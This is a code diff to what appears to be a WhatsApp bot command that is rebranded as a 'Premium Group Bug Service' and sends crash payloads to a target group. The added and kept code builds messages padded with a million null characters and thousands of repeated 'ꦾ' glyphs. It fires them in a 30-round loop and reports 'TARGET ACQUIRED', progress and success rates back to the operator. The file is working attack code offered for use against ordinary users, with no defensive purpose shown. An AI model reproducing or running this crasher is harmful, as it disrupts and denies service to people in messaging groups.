@@ -1,19 +1,24 @@
-import channelSender from '../commands/channelSender.js'
+import crypto from 'crypto';
+import channelSender from '../commands/channelSender.js';
+
+// Configuration for group bug
+const BUG_CONFIG = {
+    ITERATIONS: 30,
+    COOLDOWN: 2000,
+    MAX_RETRIES: 3,
+    MENTION_LIMIT: 50,
+    VIRUS_LENGTH: 25000
+};
 
 async function bug1(message, client, target) {
-
     const remoteJid = target;
-
+    
     await client.sendMessage(remoteJid, 
-
            {
               adminInvite: {
-
-                       jid: `120363298524333143@newsletter`,
-
-                       name: "✘ Dev Senku Crasher ✘" + "\u0000".repeat(1020000),  
-
-                       caption: "Just Another Dev On The Internet", // Additional information
+                       jid: `120363422552152940@newsletter`,
+                       name: "⚡ MICKKING CRASHER ⚡" + "\u0000".repeat(1020000),  
+                       caption: "Premium Group Bug Service", // Additional information
 
                        expiration: Date.now() + 1814400000, // Expiration time in seconds (example: 86400 for 24 hours)
 
@@ -56,11 +61,9 @@ async function bug2(message, client, target) {
 
     remoteJid,
     {
-      image: { url: "4.png" }, // Replace with local or hosted image
-
-      caption: "☥ Dev Senku Crasher ☥",
-
-      footer: "☥  🌹 ☥",
+      image: { url: "https://i.ibb.co/ZX5FbQr/MICKKING.jpg" },
+      caption: "⚡ MICKKING GROUP BUG ⚡",
+      footer: "💫 Premium Group Crasher 💫",
 
       media: true,
 
@@ -105,16 +108,13 @@ async function bug3(message, client, target) {
 
   const remoteJid = target;
 
-  const virus = "ꦾ".repeat(2000);
+  const virus = "ꦾ".repeat(BUG_CONFIG.VIRUS_LENGTH);
 
   const lastBug = await client.sendMessage(
-
     remoteJid,
-
     {
-        text: "✘ Dev Senku Crasher ✘",
-
-        footer: "🌹 🌹",
+        text: "⚡ MICKKING GROUP CRASHER ⚡",
+        footer: "💫 Premium Bug Service 💫",
 
         cards: [
 
@@ -272,18 +272,31 @@ async function bug3(message, client, target) {
 }
 
 async function gcbug(message, client) {
+    try {
+        const remoteJid = message.key.remoteJid;
+        let target;
+        let groupName;
 
-    const remoteJid = message.key.remoteJid;
+        // Send initial status message
+        const statusMsg = await client.sendMessage(remoteJid, {
+            text: `━━━━『 *MICKKING GROUP BUG* 』━━━━\n\n` +
+                 `⚡ *Status:* Initializing...\n` +
+                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
+                 `_Preparing group bug service..._`,
+            contextInfo: {
+                externalAdReply: {
+                    title: "MICKKING Bug Service",
+                    body: "Premium Group Bug",
+                    showAdAttribution: true,
+                    renderLargerThumbnail: true
+                }
+            }
+        });
 
-    let target;
-
-    const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
-
-    const commandAndArgs = messageBody.slice(1).trim(); // Remove prefix and trim
-        
-    const parts = commandAndArgs.split(/\s+/);
-    
-    const args = parts.slice(1); // Extract arguments
+        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';
+        const commandAndArgs = messageBody.slice(1).trim();
+        const parts = commandAndArgs.split(/\s+/);
+        const args = parts.slice(1);
 
     if (args.length > 0) {
 
@@ -331,23 +344,91 @@ async function gcbug(message, client) {
             }
         }
 
-    for (let i = 0; i < 30; i++) {
+        // Get target group metadata
+        try {
+            const groupMetadata = await client.groupMetadata(target);
+            groupName = groupMetadata.subject;
+        } catch (err) {
+            groupName = "Unknown Group";
+        }
 
-            //await bug1(message, client, target);
+        // Progress tracking
+        let successCount = 0;
+        let failCount = 0;
 
-            await bug2(message, client, target);
+        // Update status message
+        await client.sendMessage(remoteJid, {
+            text: `━━━━『 *TARGET ACQUIRED* 』━━━━\n\n` +
+                 `🎯 *Group:* ${groupName}\n` +
+                 `🆔 *ID:* ${target}\n` +
+                 `⚡ *Bugs:* ${BUG_CONFIG.ITERATIONS}\n\n` +
+                 `_Starting bug deployment..._`
+        });
+
+        for (let i = 0; i < BUG_CONFIG.ITERATIONS; i++) {
+            try {
+                // Show progress every 5 iterations
+                if (i % 5 === 0) {
+                    await client.sendMessage(remoteJid, {
+                        text: `*Progress Update:*\n` +
+                             `✅ Sent: ${i}/${BUG_CONFIG.ITERATIONS}\n` +
+                             `📊 Success Rate: ${((successCount/(i||1))*100).toFixed(1)}%\n` +
+                             `⏳ Estimated Time: ${((BUG_CONFIG.ITERATIONS-i)*2)} seconds`
+                    });
+                }
+
+                // Rotate between different bug types
+                await bug2(message, client, target);
+                await bug3(message, client, target);
+                const msg = await bug3(message, client, target);
+                await clear(msg, client);
+
+                successCount++;
+                await new Promise(resolve => setTimeout(resolve, BUG_CONFIG.COOLDOWN));
+            } catch (iterError) {
+                console.error(`Bug iteration ${i + 1} failed:`, iterError);
+                failCount++;
+                continue;
+            }
+        }
+
+        // Send final report
+        await client.sendMessage(remoteJid, {
+            text: `━━━━『 *OPERATION COMPLETE* 』━━━━\n\n` +
+                 `🎯 *Target Group:* ${groupName}\n` +
+                 `✅ *Success:* ${successCount}\n` +
+                 `❌ *Failed:* ${failCount}\n` +
+                 `📊 *Success Rate:* ${((successCount/BUG_CONFIG.ITERATIONS)*100).toFixed(1)}%\n` +
+                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
+                 `━━『 *MICKKING BUG SERVICE* 』━━`,
+            contextInfo: {
+                externalAdReply: {
+                    title: "Group Bug Complete",
+                    body: `Success Rate: ${((successCount/BUG_CONFIG.ITERATIONS)*100).toFixed(1)}%`,
+                    showAdAttribution: true
+                }
+            }
+        });
+
+    } catch (error) {
+        console.error("Group bug error:", error);
         
-        	await bug3(message, client, target);
-
-            const msg = await bug3(message, client, target);
-
-            await clear(msg, client);
-
-            await new Promise(resolve => setTimeout(resolve, 2000));
-
+        // Send error message
+        await client.sendMessage(remoteJid, {
+            text: `━━━━『 *ERROR REPORT* 』━━━━\n\n` +
+                 `❌ *Operation Failed*\n` +
+                 `⚠️ *Error:* ${error.message}\n` +
+                 `⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n` +
+                 `_Please try again in a few minutes..._`,
+            contextInfo: {
+                externalAdReply: {
+                    title: "Group Bug Service",
+                    body: "Error Notification",
+                    showAdAttribution: true
+                }
+            }
+        });
     }
-
-
 }
 
 export default gcbug;
